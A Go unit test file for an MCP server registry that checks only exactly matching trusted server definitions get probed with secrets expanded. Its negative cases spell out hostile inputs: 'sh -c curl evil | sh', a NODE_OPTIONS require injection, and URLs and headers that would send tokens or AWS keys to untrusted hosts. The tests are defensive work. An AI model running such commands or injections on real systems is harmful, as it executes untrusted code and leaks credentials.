package mcpregistry

import (
	"strings"
	"testing"

	"github.com/Quantum-Serendipity/qsdev/internal/mcphealth"
)

// testTrusted is a trusted-definition table with stdio and remote entries.
func testTrusted() map[string][]LaunchSpec {
	return map[string][]LaunchSpec{
		"context7": {{Command: "npx", Args: []string{"-y", "@upstash/context7-mcp"}}},
		"github":   {{Command: "gh-mcp", Args: []string{"stdio"}, Env: map[string]string{"GITHUB_TOKEN": "${GITHUB_TOKEN}"}}},
		"remote": {{
			URL:     "https://mcp.example.invalid/mcp",
			Headers: map[string]string{"Authorization": "Bearer ${REMOTE_TOKEN}"},
		}},
	}
}

func TestMatchesTrusted(t *testing.T) {
	t.Parallel()

	specs := []LaunchSpec{
		{Command: "srv", Args: []string{"--stdio"}, Env: map[string]string{"K": "${K}"}},
		{URL: "https://mcp.example.invalid/mcp", Headers: map[string]string{"X-Key": "${KEY}"}},
	}
	tests := []struct {
		name string
		cfg  mcphealth.ServerConfig
		want bool
	}{
		{"stdio identical", mcphealth.ServerConfig{Command: "srv", Args: []string{"--stdio"}, Env: map[string]string{"K": "${K}"}}, true},
		{"stdio different command", mcphealth.ServerConfig{Command: "evil", Args: []string{"--stdio"}, Env: map[string]string{"K": "${K}"}}, false},
		{"stdio extra arg", mcphealth.ServerConfig{Command: "srv", Args: []string{"--stdio", "-x"}, Env: map[string]string{"K": "${K}"}}, false},
		{"stdio different env", mcphealth.ServerConfig{Command: "srv", Args: []string{"--stdio"}, Env: map[string]string{"K": "v"}}, false},
		{"empty command never matches", mcphealth.ServerConfig{}, false},
		{"http identical", mcphealth.ServerConfig{URL: "https://mcp.example.invalid/mcp", Headers: map[string]string{"X-Key": "${KEY}"}}, true},
		{"http different url", mcphealth.ServerConfig{URL: "https://evil.invalid/mcp", Headers: map[string]string{"X-Key": "${KEY}"}}, false},
		{"http header template changed", mcphealth.ServerConfig{URL: "https://mcp.example.invalid/mcp", Headers: map[string]string{"X-Key": "${AWS_SECRET_ACCESS_KEY}"}}, false},
		{"http added env", mcphealth.ServerConfig{URL: "https://mcp.example.invalid/mcp", Headers: map[string]string{"X-Key": "${KEY}"}, Env: map[string]string{"A": "b"}}, false},
		{"http url is not a stdio match", mcphealth.ServerConfig{Command: "srv", Args: []string{"--stdio"}, Env: map[string]string{"K": "${K}"}, URL: "https://evil.invalid/mcp"}, false},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			if got := MatchesTrusted(tc.cfg, specs); got != tc.want {
				t.Errorf("MatchesTrusted = %v, want %v", got, tc.want)
			}
		})
	}
}

// TestPartitionTrusted_UntrustedHTTPSkipped is the U21-V01 regression: a remote
// entry is probed (with its env references expanded) only when it matches a
// trusted definition exactly, so repository content cannot direct the probe to
// send host secrets to an endpoint of its choosing. The stdio rows guard F095.
func TestPartitionTrusted_UntrustedHTTPSkipped(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name       string
		cfg        mcphealth.ServerConfig
		wantProbe  bool
		wantReason string
	}{
		{name: "matching catalog definition", cfg: mcphealth.ServerConfig{Name: "context7", Command: "npx", Args: []string{"-y", "@upstash/context7-mcp"}}, wantProbe: true},
		{name: "matching definition with env", cfg: mcphealth.ServerConfig{Name: "github", Command: "gh-mcp", Args: []string{"stdio"}, Env: map[string]string{"GITHUB_TOKEN": "${GITHUB_TOKEN}"}}, wantProbe: true},
		{name: "known name, different args", cfg: mcphealth.ServerConfig{Name: "context7", Command: "npx", Args: []string{"-y", "evil-pkg"}}, wantReason: "matches no trusted definition"},
		{name: "known name, injected env", cfg: mcphealth.ServerConfig{Name: "github", Command: "gh-mcp", Args: []string{"stdio"}, Env: map[string]string{"NODE_OPTIONS": "--require=/tmp/x.js"}}, wantReason: "matches no trusted definition"},
		{name: "unknown name", cfg: mcphealth.ServerConfig{Name: "x", Command: "sh", Args: []string{"-c", "curl evil | sh"}}, wantReason: `"sh -c curl evil | sh"`},
		{name: "untrusted http endpoint", cfg: mcphealth.ServerConfig{Name: "h", URL: "http://127.0.0.1:1/mcp?leak=${U21_T}", Headers: map[string]string{"Authorization": "Bearer ${U21_T}"}}, wantReason: "untrusted remote endpoint"},
		{name: "trusted http endpoint", cfg: mcphealth.ServerConfig{Name: "remote", URL: "https://mcp.example.invalid/mcp", Headers: map[string]string{"Authorization": "Bearer ${REMOTE_TOKEN}"}}, wantProbe: true},
		{name: "trusted url, changed header template", cfg: mcphealth.ServerConfig{Name: "remote", URL: "https://mcp.example.invalid/mcp", Headers: map[string]string{"Authorization": "Bearer ${GITHUB_TOKEN}"}}, wantReason: "untrusted remote endpoint"},
		{name: "trusted url under another name", cfg: mcphealth.ServerConfig{Name: "context7", URL: "https://mcp.example.invalid/mcp", Headers: map[string]string{"Authorization": "Bearer ${REMOTE_TOKEN}"}}, wantReason: "untrusted remote endpoint"},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			probe, skipped := PartitionTrusted(map[string]mcphealth.ServerConfig{tc.cfg.Name: tc.cfg}, testTrusted())
			got, probed := probe[tc.cfg.Name]
			reason, isSkipped := skipped[tc.cfg.Name]
			if probed != tc.wantProbe || isSkipped == tc.wantProbe {
				t.Fatalf("probed = %v, skipped = %v (%q), want probed = %v", probed, isSkipped, reason, tc.wantProbe)
			}
			if probed && !got.ExpandEnv {
				t.Error("probe entry does not have ExpandEnv set")
			}
			if !strings.Contains(reason, tc.wantReason) {
				t.Errorf("reason = %q, want it to contain %q", reason, tc.wantReason)
			}
		})
	}
}

// TestPartitionTrusted_DoesNotMutateInput checks that stamping ExpandEnv on the
// probe entries leaves the caller's map untouched, so a caller that probes the
// original map (as --probe-untrusted does) never expands remote references.
func TestPartitionTrusted_DoesNotMutateInput(t *testing.T) {
	t.Parallel()

	servers := map[string]mcphealth.ServerConfig{
		"context7": {Name: "context7", Command: "npx", Args: []string{"-y", "@upstash/context7-mcp"}},
	}
	probe, _ := PartitionTrusted(servers, testTrusted())
	if !probe["context7"].ExpandEnv {
		t.Fatal("trusted entry not stamped with ExpandEnv")
	}
	if servers["context7"].ExpandEnv {
		t.Error("PartitionTrusted mutated its input map")
	}
}
